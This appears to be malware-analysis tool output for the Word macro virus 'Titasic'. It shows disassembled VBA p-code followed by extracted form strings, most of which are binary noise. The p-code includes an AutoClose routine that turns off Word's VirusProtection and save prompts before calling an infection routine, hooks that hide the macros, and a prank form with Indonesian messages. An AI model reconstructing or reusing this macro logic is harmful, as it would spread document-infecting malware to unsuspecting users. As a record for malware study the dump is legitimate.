' 	MemSt DisplayAlerts 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	ArgsCall ViewVbCode 0x0000 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	Label batal 
' Line #187:
' 	EndSub 
' Line #188:
' 	FuncDefn (Sub FileTemplates())
' Line #189:
' 	ArgsCall WBF 0x0000 
' Line #190:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub FormatStyle())
' Line #193:
' 	ArgsCall WBF 0x0000 
' Line #194:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Function Refresh())
' Line #197:
' 	LitVarSpecial (True)
' 	St reset 
' Line #198:
' 	ArgsCall FileTemplates 0x0000 
' Line #199:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #200:
' 	EndFunc 
' Line #201:
' 	FuncDefn (Sub AutoClose())
' Line #202:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #203:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #204:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #205:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #206:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #207:
' 	EndWith 
' Line #208:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0007 "Titasic"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AstMaster 0x0000 
' 	EndIf 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Sub FileExit())
' Line #211:
' 	ArgsCall AutoExit 0x0000 
' Line #212:
' 	EndSub 
' Line #213:
' 	FuncDefn (Sub ToolsOptions())
' Line #214:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #215:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #216:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Function WBT())
' Line #219:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #220:
' 	EndFunc 
' Line #221:
' 	FuncDefn (Function WBF())
' Line #222:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #223:
' 	EndFunc 
' Line #224:
' Macros/VBA/TITASIC - 8179 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0004 
' 	VarDefn Teks (As String)
' Line #126:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #127:
' 	Do 
' Line #128:
' 	StartWithExpr 
' 	Ld TITASIC 
' 	With 
' Line #129:
' 	MemLdWith Height 
' 	LitDI2 0x000A 
' 	Sub 
' 	MemStWith Height 
' Line #130:
' 	MemLdWith With 
' 	LitDI2 0x000F 
' 	Sub 
' 	MemStWith With 
' Line #131:
' 	MemLdWith Height 
' 	LitDI2 0x0019 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #132:
' 	EndWith 
' Line #133:
' 	ArgsCall Beep 0x0000 
' Line #134:
' 	Loop 
' Line #135:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #138:
' 	ArgsCall TT 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub TT())
' Line #141:
' 	Dim 
' 	VarDefn a (As Byte)
' 	VarDefn diam (As Boolean)
' Line #142:
' 	Dim 
' 	VarDefn tp
' 	VarDefn tm
' 	VarDefn sel
' 	VarDefn i
' Line #143:
' 	LitDI2 0x0001 
' 	St a 
' Line #144:
' 	LitVarSpecial (True)
' 	St diam 
' Line #145:
' 	LitVarSpecial (False)
' 	Ld TITASIC 
' 	MemSt Enabled 
' Line #146:
' 	Do 
' Line #147:
' 	ArgsCall DoEvents 0x0000 
' Line #148:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	St sel 
' Line #149:
' 	Ld tp 
' 	LitDI2 0x0001 
' 	Add 
' 	St tp 
' Line #150:
' 	Ld tp 
' 	LitDI2 0x012C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #151:
' 	Ld TITASIC 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld tp 
' 	LitDI2 0x0258 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitHI4 0x0009 0x8000 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	Ld sel 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Gt 
' 	IfBlock 
' Line #157:
' 	Ld Timer 
' 	St tm 
' Line #158:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #159:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0010 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld Image1 
' 	MemLd With 
' 	Ld Label1 
' 	MemSt With 
' 	EndIf 
' Line #160:
' 	Ld Label1 
' 	MemLd Caption 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld Label1 
' 	MemSt Caption 
' Line #161:
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0004 "[! ]"
' 	Like 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Beep 0x0000 
' 	EndIf 
' Line #162:
' 	Ld Label1 
' 	MemLd Caption 
' 	FnLen 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	FnLen 
' 	Eq 
' 	IfBlock 
' Line #163:
' 	Ld diam 
' 	IfBlock 
' Line #164:
' 	Do 
' Line #165:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #166:
' 	ArgsCall DoEvents 0x0000 
' Line #167:
' 	Ld TITASIC 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #168:
' 	Loop 
' Line #169:
' 	LitVarSpecial (False)
' 	St diam 
' Line #170:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo catat 
' 	EndIf 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	Ld Label2 
' 	MemLd LBound 
' 	LitDI2 0x0009 
' 	Sub 
' 	Ld Label2 
' 	ArgsMemCall Move 0x0001 
' Line #173:
' 	Ld Label2 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd LBound 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	GoSub catat 
' 	EndIf 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndIfBlock 
' Line #176:
' 	Loop 
' Line #177:
' 	ExitSub 
' Line #178:
' 	Label catat 
' Line #179:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Label1 
' 	MemSt Caption 
' 	EndIf 
' Line #180:
' 	Ld Timer 
' 	St tm 
' Line #181:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #182:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Add 
' 	St a 
' Line #183:
' 	LitDI2 0x0000 
' 	St i 
' Line #184:
' 	LitVarSpecial (True)
' 	St diam 
' Line #185:
' 	Ld a 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #186:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #187:
' 	LitVarSpecial (True)
' 	Ld Frame1 
' 	MemSt Visible 
' Line #188:
' 	LitVarSpecial (True)
' 	Ld Image1 
' 	MemSt Visible 
' Line #189:
' 	LitVarSpecial (True)
' 	Ld TITASIC 
' 	MemSt Enabled 
' Line #190:
' 	Ld CommandButton1 
' 	ArgsMemCall SetFocus 0x0000 
' Line #191:
' 	LineCont 0x0004 0C 00 0C 00
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsLd LoadPicture 0x0001 
' 	Ld Image1 
' 	MemSt Picture 
' Line #192:
' 	ExitSub 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Return 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Private Sub UserForm_Layout())
' Line #197:
' 	Dim 
' 	VarDefn waktu
' 	VarDefn shalat
' Line #198:
' 	Ld Time 
' 	LitStr 0x0002 "hh"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	St waktu 
' Line #199:
' 	Ld waktu 
' 	SelectCase 
' Line #200:
' 	LitDI2 0x000C 
' 	LitDI2 0x000E 
' 	CaseTo 
' 	CaseDone 
' Line #201:
' 	LitStr 0x0006 "DZUHUR"
' 	St shalat 
' Line #202:
' 	LitDI2 0x000F 
' 	LitDI2 0x0011 
' 	CaseTo 
' 	CaseDone 
' Line #203:
' 	LitStr 0x0005 "ASHAR"
' 	St shalat 
' Line #204:
' 	LitDI2 0x0012 
' 	LitDI2 0x0012 
' 	CaseTo 
' 	CaseDone 
' Line #205:
' 	LitStr 0x0007 "MAGHRIB"
' 	St shalat 
' Line #206:
' 	LitDI2 0x0013 
' 	LitDI2 0x0017 
' 	CaseTo 
' 	CaseDone 
' Line #207:
' 	LitStr 0x0004 "ISYA"
' 	St shalat 
' Line #208:
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	CaseTo 
' 	CaseDone 
' Line #209:
' 	LitStr 0x0004 "ISYA"
' 	St shalat 
' Line #210:
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	CaseTo 
' 	CaseDone 
' Line #211:
' 	LitStr 0x0005 "SUBUH"
' 	St shalat 
' Line #212:
' 	CaseElse 
' Line #213:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #214:
' 	EndSelect 
' Line #215:
' Line #216:
' 	LitStr 0x0060 "Mungkin kehadiran TITASIC mengganggu kesibukan Anda, untuk itu maafkanlah kelancangan Titasic .."
' 	LitDI2 0x0001 
' 	ArgsSt Teks 0x0001 
' Line #217:
' 	LitStr 0x007B "Ingat...!! Radiasi komputer berbahaya bagi Anda! So.. istirahatlah sejenak biar enggak stres, pusing, uring-uringan, dsb..!"
' 	LitDI2 0x0002 
' 	ArgsSt Teks 0x0001 
' Line #218:
' 	LitStr 0x004D "Buat Cewek 'SINGLE' yang merasa dirinya Cakeup & Manis.., Salam dari Astia..!"
' 	LitDI2 0x0003 
' 	ArgsSt Teks 0x0001 
' Line #219:
' 	LitStr 0x0020 "Mangga bilih bade didamel deui.!"
' 	LitDI2 0x0004 
' 	ArgsSt Teks 0x0001 
' Line #220:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #221:
' 	LitStr 0x000E "By : Astia '98"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "Thanks to : "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Label3 
' 	MemSt Caption 
' Line #222:
' 	LitStr 0x0012 "Anda Sudah Shalat "
' 	Ld shalat 
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	Ld Label4 
' 	MemSt Caption 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #225:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #226:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #227:
' 	ArgsCall Beep 0x0000 
' Line #228:
' 	StartForVariable 
' 	Next 
' Line #229:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSms 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Close   g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9!0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&6$5E(6I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y(Cg,Ho=Z�]|���͇��i����ԉ��:Us
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9o$<v(C{'Az+G�(C{,H�(D+J�.G�0L�'C~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J8L}av�-Ap)@i0Gp1Hq%@i!@l%Cl+Gm-Ku/Lv*Gr/Kt*Gr >k#?l$>k";e$<c-<T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 /
(6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<e,It7X�Ts���۬�����W�e�����{��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6t!;|%A�$C�&A�)G�)G�'F�&F�+J�0K�1L�2N�"?x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%X':mSf�	!T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2d'Du%Du'Du$@u$Ew(Hy'Fx*Gy&Ew%Cw
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;h(;\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9^"@f/Pv;]�i����۸��������s��x��y�ȅ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0l"8v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:x%?&B�*E�+F�.J�.K�-H�'G�,J�2P�0L�2O�-N� ;y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'b
!X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&^)<pL_�=W�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	7!>p-H}'Du%Et$Ct'Du)Fx*Hw(Ew$Bv
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=j(=^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?d)Mr9[Vx�}�ȥ����솢�l��b��o��t��j��~��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4w$<~(@�-C�5J�8K�4M�2N�5O�6N�-K�.L�1Q�=[�:X�2P�2O�$?{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1h&;p=T�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M.Cw+Fv&Dq&Cp&Cp'Ao+Fv*Dw$Cs&Av#?t!=q%>n3?f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;e)Lt:\�Qt���О��k��Oi�Xt�Vs�Pp�`��q����?]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4y!7|$?�'B�.E�:M�9O�7P�8S�6P�5M�.I�-I�/M�;Y�>\�:Y�9U�-K�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0f"5j.At9M�':m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K,Hv$Al'Bm%<j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.\$>q(Bt%By$@v#?u#@r2>e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>i5S�@`�i�����Ie�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G4OzDc�Gn�Mo�[~���ޘ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�!?�$B�.H�7O�9P�4Q�1Q�0M�0H�)F�"B�(F�2O�:V�Le�?[�2L� ;y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0j*c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.e%4m-=u8G�?P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6b&Dn&<f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&X":r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:p#<s'?r1=d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<c$GsDh�c��\w�"9b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I(EnHd�Mk�Ps�h��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1w 8":�,C�3F�2K�5O�4Q�2O�6R�-J�-E�*F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�%A�.M�9W�Kg�Ba�,I� =~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5j%=p'?r,Cq#1e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-[%5Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/f 7n 7m.>_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7`*Fs=Y�m��:T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L$;i<V�Ie�]}���ɸ��i��(_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4o 7z!;}%>�,D�2I�2O�4T�5N�2N�6M�$<~2J�,G�,D�'C�'B�2O�Ii�Vt�#>�'D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#P6Q|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-\Xo�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*]+;]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4[$Bj0OzLh�2Gv"P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
